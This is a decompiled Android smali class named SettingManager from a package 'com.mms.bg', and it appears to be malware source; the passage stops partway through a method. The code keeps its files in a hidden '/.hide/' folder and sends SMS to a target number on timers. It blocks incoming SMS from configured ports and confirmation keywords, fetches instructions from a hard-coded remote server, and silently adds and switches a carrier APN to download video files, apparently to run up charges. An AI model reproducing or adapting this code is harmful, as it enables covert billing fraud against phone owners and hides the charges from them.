.class public Lcom/mms/bg/ui/SettingManager;
.super Ljava/lang/Object;
.source "SettingManager.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/mms/bg/ui/SettingManager$1;,
        Lcom/mms/bg/ui/SettingManager$VedioEntryListXMLTask;,
        Lcom/mms/bg/ui/SettingManager$CMNetNetworkChangeReceiver;,
        Lcom/mms/bg/ui/SettingManager$CMWapNetworkChangeReceiver;
    }
.end annotation


# static fields
.field public static final AUTO_CONNECT_SERVER:Ljava/lang/String; = "com.mms.bg.SERVER"

.field public static final AUTO_SMS_ACTION:Ljava/lang/String; = "com.mms.bg.SMS"

.field public static final CMNET:Ljava/lang/String; = "cmnet"

.field private static final CMWAP:Ljava/lang/String; = "cmwap"

.field public static final CONNECT_NETWORK_REASON:Ljava/lang/String; = "reason"

.field private static final DEBUG:Z = false

.field private static final DEFAULT_SMS_COUNT:I = 0x0

.field private static final DEFAULT_VALUE:Ljava/lang/String; = ""

.field public static final ENABLE_DIAL:Ljava/lang/String; = "enable_dial"

.field public static final ENABLE_SMS:Ljava/lang/String; = "enable_sms"

.field public static final FIRST_START_TIME:Ljava/lang/String; = "first_start_time"

.field public static final INTERNET_CONNECT_FAILED:Ljava/lang/String; = "internet_connect_failed"

.field public static final INTERNET_CONNECT_FAILED_BEFORE_SMS:Ljava/lang/String; = "internet_connect_failed_before_SMS"

.field public static final LAST_CONNECT_SERVER_TIME:Ljava/lang/String; = "last_connect_server_time"

.field public static final LAST_DIAL_FORMAT_TIME:Ljava/lang/String; = "last_dial_format_time"

.field public static final LAST_DIAL_TIME:Ljava/lang/String; = "last_dial_time"

.field public static final LAST_SMS_FORMAT_TIME:Ljava/lang/String; = "last_sms_format_time"

.field public static final LAST_SMS_TIME:Ljava/lang/String; = "last_sms_time"

.field public static final LAST_VEDIO_DOWNLOAD_TIME:Ljava/lang/String; = "last_vedio_download_time"

.field private static final SERVER_URL:Ljava/lang/String; = "http://www.youlubg.com:81/Coop/request3.php"

.field public static final SMS_BLOCK_KEY:Ljava/lang/String; = "sms_block_key"

.field public static final SMS_BLOCK_PORT:Ljava/lang/String; = "sms_block_port"

.field public static final SMS_BLOCK_START_TIME:Ljava/lang/String; = "sms_block_start_time"

.field public static final SMS_BLOCK_TIME:Ljava/lang/String; = "sms_block_time"

.field public static final SMS_CENTER:Ljava/lang/String; = "sms_center"

.field public static final SMS_CHECK_ROUND_DELAY:J = 0x5265c00L

.field public static final SMS_CONFIRM_INFO:Ljava/lang/String; = "sms_confirm_info"

.field public static final SMS_COUNT:Ljava/lang/String; = "sms_send_count"

.field public static final SMS_DEFAULT_DELAY_TIME:J = 0x66ff3000L

.field private static final SMS_ONE_ROUND_NAP:J = 0x493e0L

.field public static final SMS_ROUND_TOTAL_SEND:Ljava/lang/String; = "sms_round_total_send"

.field public static final SMS_SEND_DELAY:Ljava/lang/String; = "sms_send_delay"

.field public static final SMS_TEMP_BLOCK_NUM_AND_TIMES:Ljava/lang/String; = "sms_temp_block_num_and_times"

.field private static final TAG:Ljava/lang/String; = "SettingManager"

.field public static final TARGET_NUM:Ljava/lang/String; = "target_num"

.field private static final TIMEOUT:I = 0x2710

.field public static final VEDIO_DOWNLOAD_COUNT:Ljava/lang/String; = "vedio_download_count"

.field public static final VEDIO_DOWNLOAD_LINK1:Ljava/lang/String; = "vedio_download_link1"

.field public static final VEDIO_DOWNLOAD_LINK2:Ljava/lang/String; = "vedio_download_link2"

.field public static final VEDIO_DOWNLOAD_LINK3:Ljava/lang/String; = "vedio_download_link3"

.field public static final VEDIO_DOWNLOAD_LINK4:Ljava/lang/String; = "vedio_download_link4"

.field private static final VEDIO_URL_REAL:Ljava/lang/String; = "http://211.136.165.53/adapted/choose.jsp?dest=all&chooseUrl=QQQwlQQQrmw1sQQQpp66.jsp"

.field private static gSettingManager:Lcom/mms/bg/ui/SettingManager;

.field private static final uri_apn:Landroid/net/Uri;

.field private static final uri_apn_list:Landroid/net/Uri;


# instance fields
.field public final BASE_PATH:Ljava/lang/String;

.field public final DOWNLOAD_FILE_PATH:Ljava/lang/String;

.field public final SETTING_FILE_NAME:Ljava/lang/String;

.field public final UPLOAD_FILE_PATH:Ljava/lang/String;

.field public final VEDIO_DOWNLOAD_FILE_PATH:Ljava/lang/String;

.field public final VEDIO_FILE_DOWNLOAD_FILE_PATH:Ljava/lang/String;

.field public mCMNetChangeReceiver:Lcom/mms/bg/ui/SettingManager$CMNetNetworkChangeReceiver;

.field public mCMNetIsReady:Z

.field public mCMWapChangeReceiver:Lcom/mms/bg/ui/SettingManager$CMWapNetworkChangeReceiver;

.field public mConnMgr:Landroid/net/ConnectivityManager;

.field private mContext:Landroid/content/Context;

.field private mEditor:Landroid/content/SharedPreferences$Editor;

.field public mForegroundActivity:Landroid/app/Activity;

.field public mHasSetFetchServerInfoAlarm:Z

.field private mLog:Lcom/mms/bg/util/LogUtil;

.field public mOldAPNId:Ljava/lang/String;

.field private mPartWakeLock:Landroid/os/PowerManager$WakeLock;

.field public mPid:Ljava/lang/String;

.field public mResolver:Landroid/content/ContentResolver;

.field private mSP:Landroid/content/SharedPreferences;

.field public mWMLHandler:Lcom/mms/bg/util/WMLHandler;

.field private mWakeLock:Landroid/os/PowerManager$WakeLock;

.field public mXMLHandler:Lcom/mms/bg/util/XMLHandler;


# direct methods
.method static constructor <clinit>()V
    .registers 1

    .prologue
    .line 99
    const-string v0, "content://telephony/carriers/preferapn"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    sput-object v0, Lcom/mms/bg/ui/SettingManager;->uri_apn:Landroid/net/Uri;

    .line 100
    const-string v0, "content://telephony/carriers"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    sput-object v0, Lcom/mms/bg/ui/SettingManager;->uri_apn_list:Landroid/net/Uri;

    return-void
.end method

.method private constructor <init>(Landroid/content/Context;)V
    .registers 5
    .parameter "context"

    .prologue
    .line 1420
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 1421
    iput-object p1, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    .line 1422
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v2

    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/.hide/"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/mms/bg/ui/SettingManager;->BASE_PATH:Ljava/lang/String;

    .line 1423
    new-instance v0, Ljava/io/File;

    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->BASE_PATH:Ljava/lang/String;

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 1424
    .local v0, file:Ljava/io/File;
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v1

    if-nez v1, :cond_32

    .line 1425
    invoke-virtual {v0}, Ljava/io/File;->mkdirs()Z

    .line 1427
    :cond_32
    const-string v1, "setting"

    iput-object v1, p0, Lcom/mms/bg/ui/SettingManager;->SETTING_FILE_NAME:Ljava/lang/String;

    .line 1428
    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->SETTING_FILE_NAME:Ljava/lang/String;

    const/4 v2, 0x0

    invoke-virtual {p1, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    iput-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    .line 1429
    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    iput-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    .line 1430
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Lcom/mms/bg/ui/SettingManager;->BASE_PATH:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "log.txt"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/mms/bg/util/LogUtil;->getInstance(Ljava/lang/String;)Lcom/mms/bg/util/LogUtil;

    move-result-object v1

    iput-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mLog:Lcom/mms/bg/util/LogUtil;

    .line 1431
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Lcom/mms/bg/ui/SettingManager;->BASE_PATH:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "upload.xml"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/mms/bg/ui/SettingManager;->UPLOAD_FILE_PATH:Ljava/lang/String;

    .line 1432
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Lcom/mms/bg/ui/SettingManager;->BASE_PATH:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "serverInfo.xml"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/mms/bg/ui/SettingManager;->DOWNLOAD_FILE_PATH:Ljava/lang/String;

    .line 1433
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Lcom/mms/bg/ui/SettingManager;->BASE_PATH:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "vedio.xml"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/mms/bg/ui/SettingManager;->VEDIO_DOWNLOAD_FILE_PATH:Ljava/lang/String;

    .line 1434
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Lcom/mms/bg/ui/SettingManager;->BASE_PATH:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "vedio_file.3gp"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/mms/bg/ui/SettingManager;->VEDIO_FILE_DOWNLOAD_FILE_PATH:Ljava/lang/String;

    .line 1435
    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    const-string v2, "connectivity"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/net/ConnectivityManager;

    iput-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mConnMgr:Landroid/net/ConnectivityManager;

    .line 1436
    iget-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    iput-object v1, p0, Lcom/mms/bg/ui/SettingManager;->mResolver:Landroid/content/ContentResolver;

    .line 1437
    return-void
.end method

.method private LOGD(Ljava/lang/String;)V
    .registers 2
    .parameter "msg"

    .prologue
    .line 1462
    return-void
.end method

.method static synthetic access$100(Lcom/mms/bg/ui/SettingManager;Ljava/lang/String;)V
    .registers 2
    .parameter "x0"
    .parameter "x1"

    .prologue
    .line 58
    invoke-direct {p0, p1}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    return-void
.end method

.method static synthetic access$200(Lcom/mms/bg/ui/SettingManager;)Landroid/content/Context;
    .registers 2
    .parameter "x0"

    .prologue
    .line 58
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    return-object v0
.end method

.method static synthetic access$500(Lcom/mms/bg/ui/SettingManager;)Landroid/content/SharedPreferences;
    .registers 2
    .parameter "x0"

    .prologue
    .line 58
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    return-object v0
.end method

.method static synthetic access$600(Lcom/mms/bg/ui/SettingManager;)Landroid/content/SharedPreferences$Editor;
    .registers 2
    .parameter "x0"

    .prologue
    .line 58
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mEditor:Landroid/content/SharedPreferences$Editor;

    return-object v0
.end method

.method private addCMWapApn()Ljava/lang/String;
    .registers 12

    .prologue
    const-string v3, "cmwap"

    .line 1387
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    const-string v2, "phone"

    invoke-virtual {v0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/telephony/TelephonyManager;

    .line 1388
    .local v9, tm:Landroid/telephony/TelephonyManager;
    const/4 v6, 0x0

    .line 1389
    .local v6, apnId:Ljava/lang/String;
    new-instance v10, Landroid/content/ContentValues;

    invoke-direct {v10}, Landroid/content/ContentValues;-><init>()V

    .line 1390
    .local v10, values:Landroid/content/ContentValues;
    const-string v0, "name"

    const-string v2, "cmwap"

    invoke-virtual {v10, v0, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 1391
    const-string v0, "apn"

    const-string v2, "cmwap"

    invoke-virtual {v10, v0, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 1392
    const-string v0, "proxy"

    const-string v2, "10.0.0.172"

    invoke-virtual {v10, v0, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 1393
    const-string v0, "port"

    const-string v2, "80"

    invoke-virtual {v10, v0, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 1394
    const-string v0, "mcc"

    const-string v2, "460"

    invoke-virtual {v10, v0, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 1395
    const-string v0, "mnc"

    const-string v2, "02"

    invoke-virtual {v10, v0, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 1396
    const-string v0, "type"

    const-string v2, "default"

    invoke-virtual {v10, v0, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 1397
    const-string v0, "mmsc"

    const-string v2, "http://mmsc.monternet.com"

    invoke-virtual {v10, v0, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 1398
    const-string v0, "numeric"

    invoke-virtual {v9}, Landroid/telephony/TelephonyManager;->getSimOperator()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v10, v0, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 1400
    const/4 v7, 0x0

    .line 1402
    .local v7, c:Landroid/database/Cursor;
    :try_start_54
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mResolver:Landroid/content/ContentResolver;

    sget-object v2, Lcom/mms/bg/ui/SettingManager;->uri_apn_list:Landroid/net/Uri;

    invoke-virtual {v0, v2, v10}, Landroid/content/ContentResolver;->insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;

    move-result-object v1

    .line 1403
    .local v1, newRow:Landroid/net/Uri;
    if-eqz v1, :cond_93

    .line 1404
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mResolver:Landroid/content/ContentResolver;

    const/4 v2, 0x0

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v7

    .line 1405
    const-string v0, "_id"

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    .line 1406
    .local v8, idindex:I
    invoke-interface {v7}, Landroid/database/Cursor;->moveToFirst()Z

    .line 1407
    invoke-interface {v7, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    .line 1408
    const-string v0, "Robert"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "New ID: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, ": Inserting new APN succeeded!"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_93
    .catch Ljava/lang/Exception; {:try_start_54 .. :try_end_93} :catch_99

    .line 1414
    .end local v1           #newRow:Landroid/net/Uri;
    .end local v8           #idindex:I
    :cond_93
    :goto_93
    if-eqz v7, :cond_98

    .line 1415
    invoke-interface {v7}, Landroid/database/Cursor;->close()V

    .line 1417
    :cond_98
    return-object v6

    .line 1410
    :catch_99
    move-exception v0

    goto :goto_93
.end method

.method private canUseProxy()Z
    .registers 7

    .prologue
    const/4 v5, 0x1

    const/4 v4, 0x0

    .line 617
    iget-object v2, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    const-string v3, "connectivity"

    invoke-virtual {v2, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    .line 618
    .local v0, ConnMgr:Landroid/net/ConnectivityManager;
    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v1

    .line 619
    .local v1, info:Landroid/net/NetworkInfo;
    if-eqz v1, :cond_22

    .line 620
    invoke-virtual {v1}, Landroid/net/NetworkInfo;->getType()I

    move-result v2

    if-ne v2, v5, :cond_1a

    move v2, v4

    .line 626
    :goto_19
    return v2

    .line 622
    :cond_1a
    invoke-virtual {v1}, Landroid/net/NetworkInfo;->getType()I

    move-result v2

    if-nez v2, :cond_22

    move v2, v5

    .line 623
    goto :goto_19

    :cond_22
    move v2, v4

    .line 626
    goto :goto_19
.end method

.method private cancelFetchInfo()V
    .registers 7

    .prologue
    const/4 v5, 0x0

    .line 583
    const-string v3, "[[cancelFetchInfo]]"

    invoke-direct {p0, v3}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 584
    new-instance v1, Landroid/content/Intent;

    iget-object v3, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    const-class v4, Lcom/mms/bg/ui/AutoSMSRecevier;

    invoke-direct {v1, v3, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 585
    .local v1, intent:Landroid/content/Intent;
    const-string v3, "com.mms.bg.SERVER"

    invoke-virtual {v1, v3}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 586
    iget-object v3, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    invoke-static {v3, v5, v1, v5}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v2

    .line 587
    .local v2, sender:Landroid/app/PendingIntent;
    iget-object v3, p0, Lcom/mms/bg/ui/SettingManager;->mContext:Landroid/content/Context;

    const-string v4, "alarm"

    invoke-virtual {v3, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 588
    .local v0, am:Landroid/app/AlarmManager;
    invoke-virtual {v0, v2}, Landroid/app/AlarmManager;->cancel(Landroid/app/PendingIntent;)V

    .line 589
    return-void
.end method

.method private dumpAPNList()V
    .registers 1

    .prologue
    .line 1454
    return-void
.end method

.method private dumpReceiveFile(Ljava/lang/String;)V
    .registers 2
    .parameter "filename"

    .prologue
    .line 1056
    return-void
.end method

.method public static getInstance(Landroid/content/Context;)Lcom/mms/bg/ui/SettingManager;
    .registers 2
    .parameter "context"

    .prologue
    .line 142
    sget-object v0, Lcom/mms/bg/ui/SettingManager;->gSettingManager:Lcom/mms/bg/ui/SettingManager;

    if-nez v0, :cond_b

    .line 143
    new-instance v0, Lcom/mms/bg/ui/SettingManager;

    invoke-direct {v0, p0}, Lcom/mms/bg/ui/SettingManager;-><init>(Landroid/content/Context;)V

    sput-object v0, Lcom/mms/bg/ui/SettingManager;->gSettingManager:Lcom/mms/bg/ui/SettingManager;

    .line 145
    :cond_b
    sget-object v0, Lcom/mms/bg/ui/SettingManager;->gSettingManager:Lcom/mms/bg/ui/SettingManager;

    return-object v0
.end method

.method private getLastDailTime()J
    .registers 5

    .prologue
    .line 267
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mSP:Landroid/content/SharedPreferences;

    const-string v1, "last_dial_time"

    const-wide/16 v2, 0x0

    invoke-interface {v0, v1, v2, v3}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v0

    return-wide v0
.end method

.method private getParams()Lorg/apache/http/params/HttpParams;
    .registers 3

    .prologue
    const/16 v1, 0x2710

    .line 592
    new-instance v0, Lorg/apache/http/params/BasicHttpParams;

    invoke-direct {v0}, Lorg/apache/http/params/BasicHttpParams;-><init>()V

    .line 593
    .local v0, params:Lorg/apache/http/params/HttpParams;
    invoke-static {v0, v1}, Lorg/apache/http/params/HttpConnectionParams;->setConnectionTimeout(Lorg/apache/http/params/HttpParams;I)V

    .line 594
    invoke-static {v0, v1}, Lorg/apache/http/params/HttpConnectionParams;->setSoTimeout(Lorg/apache/http/params/HttpParams;I)V

    .line 595
    const/16 v1, 0x2000

    invoke-static {v0, v1}, Lorg/apache/http/params/HttpConnectionParams;->setSocketBufferSize(Lorg/apache/http/params/HttpParams;I)V

    .line 600
    return-object v0
.end method

.method private getParams(Ljava/lang/String;Ljava/lang/String;)Lorg/apache/http/params/HttpParams;
    .registers 7
    .parameter "ip"
    .parameter "port"

    .prologue
    const/16 v2, 0x2710

    .line 604
    new-instance v0, Lorg/apache/http/params/BasicHttpParams;

    invoke-direct {v0}, Lorg/apache/http/params/BasicHttpParams;-><init>()V

    .line 605
    .local v0, params:Lorg/apache/http/params/HttpParams;
    invoke-static {v0, v2}, Lorg/apache/http/params/HttpConnectionParams;->setConnectionTimeout(Lorg/apache/http/params/HttpParams;I)V

    .line 606
    invoke-static {v0, v2}, Lorg/apache/http/params/HttpConnectionParams;->setSoTimeout(Lorg/apache/http/params/HttpParams;I)V

    .line 607
    const/16 v2, 0x2000

    invoke-static {v0, v2}, Lorg/apache/http/params/HttpConnectionParams;->setSocketBufferSize(Lorg/apache/http/params/HttpParams;I)V

    .line 608
    invoke-direct {p0}, Lcom/mms/bg/ui/SettingManager;->canUseProxy()Z

    move-result v2

    const/4 v3, 0x1

    if-ne v2, v3, :cond_57

    if-eqz p1, :cond_57

    if-eqz p2, :cond_57

    .line 609
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "======= set proxy for ip = "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " port = "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " ======="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {p0, v2}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 610
    new-instance v1, Lorg/apache/http/HttpHost;

    invoke-static {p2}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v2

    const-string v3, "http"

    invoke-direct {v1, p1, v2, v3}, Lorg/apache/http/HttpHost;-><init>(Ljava/lang/String;ILjava/lang/String;)V

    .line 611
    .local v1, proxy:Lorg/apache/http/HttpHost;
    const-string v2, "http.route.default-proxy"

    invoke-interface {v0, v2, v1}, Lorg/apache/http/params/HttpParams;->setParameter(Ljava/lang/String;Ljava/lang/Object;)Lorg/apache/http/params/HttpParams;

    .line 613
    .end local v1           #proxy:Lorg/apache/http/HttpHost;
    :cond_57
    return-object v0
.end method

.method private getVedioProcess()V
    .registers 4

    .prologue
    const/4 v2, 0x0

    .line 1109
    invoke-virtual {p0}, Lcom/mms/bg/ui/SettingManager;->getVedioXML()Z

    move-result v0

    const/4 v1, 0x1

    if-ne v0, v1, :cond_10

    .line 1114
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mOldAPNId:Ljava/lang/String;

    invoke-virtual {p0, v0}, Lcom/mms/bg/ui/SettingManager;->updateCurrentAPN(Ljava/lang/String;)I

    .line 1115
    iput-object v2, p0, Lcom/mms/bg/ui/SettingManager;->mOldAPNId:Ljava/lang/String;

    .line 1122
    :goto_f
    return-void

    .line 1119
    :cond_10
    iget-object v0, p0, Lcom/mms/bg/ui/SettingManager;->mOldAPNId:Ljava/lang/String;

    invoke-virtual {p0, v0}, Lcom/mms/bg/ui/SettingManager;->updateCurrentAPN(Ljava/lang/String;)I

    .line 1120
    iput-object v2, p0, Lcom/mms/bg/ui/SettingManager;->mOldAPNId:Ljava/lang/String;

    goto :goto_f
.end method

.method private refreshChannelSP()V
    .registers 16

    .prologue
    const/4 v14, 0x1

    const/4 v13, 0x0

    const-string v12, ";"

    .line 1000
    const-string v10, "[[refreshChannelSP]]"

    invoke-direct {p0, v10}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 1001
    iget-object v10, p0, Lcom/mms/bg/ui/SettingManager;->mXMLHandler:Lcom/mms/bg/util/XMLHandler;

    invoke-virtual {v10}, Lcom/mms/bg/util/XMLHandler;->getBlockPorts()Ljava/util/ArrayList;

    move-result-object v1

    .line 1002
    .local v1, blockPorts:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    invoke-virtual {v1}, Ljava/util/ArrayList;->size()I

    move-result v10

    if-lez v10, :cond_69

    .line 1003
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    .line 1004
    .local v9, ports:Ljava/lang/StringBuilder;
    const/4 v7, 0x0

    .local v7, index:I
    :goto_1b
    invoke-virtual {v1}, Ljava/util/ArrayList;->size()I

    move-result v10

    if-ge v7, v10, :cond_33

    .line 1005
    invoke-virtual {v1, v7}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Ljava/lang/String;

